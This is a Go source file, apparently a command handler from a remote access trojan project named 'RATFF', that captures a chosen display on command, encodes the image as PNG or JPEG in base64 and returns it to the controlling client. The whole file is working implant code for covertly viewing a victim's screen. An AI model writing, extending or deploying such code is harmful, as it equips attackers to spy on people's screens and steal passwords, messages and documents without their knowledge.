package main

import (
	"bytes"
	"encoding/base64"
	"image/jpeg"
	"image/png"

	"RATFF/shared"

	"github.com/kbinani/screenshot"
)

func handleScreenCapture(msg shared.Message) shared.Message {
	format := "png"
	if f, ok := msg.Payload["format"].(string); ok && f != "" {
		format = f
	}

	quality := 90
	if q, ok := msg.Payload["quality"].(float64); ok {
		quality = int(q)
		if quality < 0 || quality > 100 {
			quality = 90
		}
	}

	displayIndex := 0
	if idx, ok := msg.Payload["display_index"].(float64); ok {
		displayIndex = int(idx)
	}

	displayCount := screenshot.NumActiveDisplays()
	if displayCount == 0 {
		return shared.NewMessage(shared.MsgError, shared.CmdScreenCapture, msg.ClientID,
			map[string]interface{}{"error": "no displays found"})
	}

	if displayIndex < 0 || displayIndex >= displayCount {
		return shared.NewMessage(shared.MsgError, shared.CmdScreenCapture, msg.ClientID,
			map[string]interface{}{"error": "invalid display index"})
	}

	img, err := screenshot.CaptureDisplay(displayIndex)
	if err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdScreenCapture, msg.ClientID,
			map[string]interface{}{"error": err.Error()})
	}

	var buf bytes.Buffer
	switch format {
	case "jpeg", "jpg":
		if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
			return shared.NewMessage(shared.MsgError, shared.CmdScreenCapture, msg.ClientID,
				map[string]interface{}{"error": err.Error()})
		}
		format = "jpeg"
	default:
		if err := png.Encode(&buf, img); err != nil {
			return shared.NewMessage(shared.MsgError, shared.CmdScreenCapture, msg.ClientID,
				map[string]interface{}{"error": err.Error()})
		}
		format = "png"
	}

	bounds := img.Bounds()
	encoded := base64.StdEncoding.EncodeToString(buf.Bytes())

	result := map[string]interface{}{
		"image_data":    encoded,
		"width":         bounds.Dx(),
		"height":        bounds.Dy(),
		"format":        format,
		"display_index": displayIndex,
		"display_count": displayCount,
	}

	return shared.NewMessage(shared.MsgResponse, shared.CmdScreenCapture, msg.ClientID, result)
}
